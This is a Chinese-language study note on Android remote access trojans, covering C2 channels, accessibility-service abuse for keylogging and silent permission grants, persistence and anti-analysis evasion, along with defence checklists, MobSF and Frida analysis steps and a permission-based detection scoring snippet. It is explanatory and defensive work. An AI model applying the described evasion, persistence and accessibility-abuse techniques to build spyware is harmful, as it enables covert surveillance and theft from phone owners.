> 来源：抖音「新黑客第一课」笔记拆解（二维码课 → 木马课预告）+ 8 路搜索引擎交叉研究

## 一、RAT 技术栈原理（理解恶意软件怎么运作）

### 1.1 什么是 RAT
RAT（Remote Access Trojan，远程访问木马）= 控制端 + 被控端（手机）+ 通信中枢（C2）三层架构。
Android 是重灾区：权限模型碎片化 + 侧载随意 + 用户一键授权习惯。

### 1.2 C2 架构（命令与控制通道）

| 通信方式 | 原理 | 案例 |
|:---|:---|:---|
| Socket.io/WebSocket 直连 | 设备主动连服务器（反弹连接），双向实时 | AhMyth（Socket.io）、BTMOB |
| Telegram Bot 作 C2 | 利用 TG 消息 API 下发指令/回传，分布式难拦截 | WuzenRat |
| FCM 推送作 C2 | 合法推送通道触发行为，增强隐蔽性 | RatOn |
| DGA 动态域名 | 域名生成算法逃避黑名单 | OctoV2（DeepSeek 仿冒） |
| 明文 HTTP 轮询 | 简单粗暴，可被流量分析 | 早期 RAT |

**反弹连接原理**：被控端主动外连 C2（穿透 NAT/防火墙），上线后保持长连接（心跳），控制端下发指令、被控端回传数据。AhMyth 用 `IO.socket("http://ip:port?model=...&manf=...&id="+ANDROID_ID)` 带上设备信息自动上报，`opts.reconnection=true` 断线自动重连。

### 1.3 核心攻击链（免 Root 提权）

```
安装(钓鱼APK) → 诱导开无障碍服务(Accessibility) → 自动点击授权/静默装其它应用
             → 后台常驻 → 数据采集(短信/通讯录/录音/截图) → 回传 C2 → 执行远控指令
```

**无障碍服务 = 免 Root 提权的总开关**（BTMOB/Moukthar/Nexus 核心机制）：
- 监听 `TYPE_WINDOW_CONTENT_CHANGED` → 自动点「允许」按钮（权限绕过：用户拒绝也能替你点允许）
- 监听 `TYPE_VIEW_TEXT_CHANGED` → 键盘记录（Keylogger）
- 自动跳转设置页开启悬浮窗/设备管理器/后台运行
- 静默安装应用（模拟点击安装界面「下一步」）
- RedHook 变体更绝：**滥用 ADB 无线调试**——无障碍自动点击开启开发者选项→无线调试→本地连 ADB→获得 uid 2000 shell 级权限（相当于开发者的权限）

### 1.4 权限维持/持久化（赖着不走）

| 手段 | 原理 |
|:---|:---|
| 开机自启 | AndroidManifest 注册 `BOOT_COMPLETED` 广播，重启自动拉起 |
| 服务守护 | 监听服务终止事件自动重启；前台服务（ForegroundService）防杀 |
| 多进程互拉 | 多进程相互监听，单个被杀立即拉起 |
| 隐藏图标 | `hideApplicationIcon()` 移除桌面图标，仅设置可见 |
| 伪装卸载 | 点卸载显示成功，实际服务还在跑 |
| 设备管理器权限 | 获取管理员权限提升卸载难度；监控设置界面自动关闭（Nexus） |
| 电池优化白名单 | 系统杀后台时豁免 |

### 1.5 免杀/抗分析思路

- 反模拟器：检测 IMEI/Build 属性，环境异常停止恶意行为
- 加密/混淆：APK 加密（7-Zip 密码保护，jadx/apktool 无法解析——OctoV2）、代码混淆（ProGuard）、DEX 动态加载（assets 藏 .cat → 运行时解密加载）
- C2 门控：先输入邀请码→POST C2→返回 success 才暴露恶意行为（沙箱分析看起来良性）
- 隐藏通信：WebSocket 封装、非 HTTP 协议、加密配置文件
- MaaS 免编码：可视化 APK 生成器（BTMOB 月付 $700/终身 $5000），黑产平民化

## 二、木马植入路径 + 防御检测

### 2.1 植入路径（传播链）

| 路径 | 手法 | 识别点 |
|:---|:---|:---|
| **二维码钓鱼(quishing)** | 扫码→恶意链接→诱导下载 APK | 陌生码不扫、扫码前看 URL |
| 仿冒应用商店 | 跳转伪造 Google Play 界面（假评分/下载量） | 看域名、官方渠道下载 |
| 钓鱼链接 | 短信/WhatsApp 发「更新验证」「身份核验」链接 | 政府/银行不会要你装 APK |
| 仿冒知名 App | DeepSeek 仿冒 APK（OctoV2）伪装更新界面 | 官方商店核对包名 |
| 恶意推广 | WiFi 密码查看器类诱导开无障碍→静默装推广应用 | 权限请求可疑 |

### 2.2 个人防御清单

1. **无障碍服务 = 最高警戒**：任何非可信 App 请求无障碍权限都要三思（这是键盘记录/权限绕过/自动点击的总开关）
2. 通知使用权：设置里检查哪些 App 能读通知，不该有的全关（防验证码窃取）
3. 只装官方应用商店；关闭「允许未知来源」；不从陌生链接/网盘装 APK
4. 权限最小化：定期审查应用权限；不给非必要 App 短信/通讯录/定位/相机组合权限
5. 保持系统 + 安全补丁更新
6. 检查已安装应用列表，确认没有陌生包名/不起眼的「系统应用」

### 2.3 检测信号（自家手机自查）

- 无障碍服务列表有陌生 App / 弹窗自动消失或被自动点击
- 后台请求无障碍权限并引导开启
- 无合理场景却读短信/联系人/位置
- 频繁截图/调用相机麦克风
- 隐藏图标、无法正常卸载、自动重启服务
- 向陌生 IP 上传批量数据（流量分析）
- 电耗异常/流量异常/莫名弹广告

### 2.4 应急响应（已中招）

```
① 断开网络（停止数据外泄）→ ② 关无障碍/设备管理器/悬浮窗授权 → ③ 卸载恶意 App（清缓存数据）
→ ④ 全盘安全扫描 → ⑤ 重置支付/社交/邮箱密码 + 开二次验证 → ⑥ 审计通话/短信/位置记录评估泄露范围
→ 严重情况：恢复出厂设置
```

## 三、合法远程控制研究（自己设备）

### 3.1 ADB + Scrcpy（官方调试，非恶意）

```
# 前置：手机开开发者选项 + USB 调试
adb devices                              # 有线连接
adb tcpip 5555                           # 转无线模式（重启后需重设）
adb connect <手机IP>:5555                # 无线连接
scrcpy -m 1024 --max-fps 30 -KS          # 控制（限分辨率/帧率；K=物理键盘；S=关屏幕）
scrcpy --record screen.mp4               # 录屏
scrcpy --turn-screen-off                 # 远程控制时熄屏
# 多设备：-d USB / -e TCPIP / -s 序列号
```
> 安全提醒：无线 ADB 端口 5555 若开放且未加密 → 局域网内设备完全暴露。用完关无线调试，或用 SSH 隧道封装。

### 3.2 合法 RAT 框架分析（学习用）
- **AhMyth**（开源教育项目）：Electron 控制端 + Android 客户端，Socket.io 通信——研究双端架构/权限申请/通信模型的绝佳样本
- **Moukthar**（开源，几千行）：键盘记录/短信窃取/通话录音/摄像头——源码可读性极高的入门样本（客户端 + PHP 控制端 + WebSocket 中枢）
- ⚠️ 只在自己/授权的设备 + 模拟器 + 隔离环境分析，仅限授权测试

## 四、恶意样本分析（蓝队技能）

### 4.1 MobSF 静态分析流程
```
安装: pip install mobsf / docker 或 Windows 版
上传 APK → 自动分析：
  ① Manifest 分析：权限列表/无障碍服务声明/导出组件/启动入口
  ② 代码分析：硬编码 C2 URL/加密串/动态加载(FileDex/DexClassLoader)
  ③ 资源分析：隐藏 assets/混淆
  ④ 签名信息：作者指纹
```

### 4.2 关键静态检测特征（BTMOB 检测规则提炼）
```python
# 静态检测评分规则（防御工具思路）
if "BIND_ACCESSIBILITY_SERVICE" in permissions: score += 3   # 无障碍 = 高危
if "READ_SMS" and "READ_CONTACTS" and "ACCESS_FINE_LOCATION": score += 3  # 组合敏感权限
if "ACCESSIBILITY_SERVICE" in services: score += 3            # 声明无障碍服务
if not launcher_activity: score += 2                          # 隐藏图标特征
if "fake_uninstall" in activities: score += 3                 # 伪卸载特征
if "BOOT_COMPLETED" in receivers: score += 2                  # 开机自启
```

### 4.3 动态分析（行为基线）
- Frida 插桩：hook 关键函数观察/修改返回值（如绕过反模拟器检测 isEmu 函数、打印回连 IP/端口）
- 模拟器 + 云真机跑样本，观察网络连接/权限请求/文件行为
- C2 门控样本需先输入邀请码触发恶意分支

## 五、防御体系总结（纵深防御）

| 层 | 措施 |
|:---|:---|
| 用户层 | 只装官方渠道 / 不扫陌生码 / 不授权可疑 App / 定期权限审查 |
| 服务管控 | 无障碍/通知使用权/设备管理器白名单化，MDM 禁未知来源安装 |
| 行为层 | 从特征码检测转向行为基线（权限组合/网络异常/无障碍滥用） |
| 企业层 | 应用白名单 + MDM 权限最小化 + 高危服务管控 |

核心认知：**免 Root 时代，一次无障碍授权 = 系统级控制**。防御重心从「查杀样本」转向「管控高危服务 + 权限最小化 + 行为监测」。
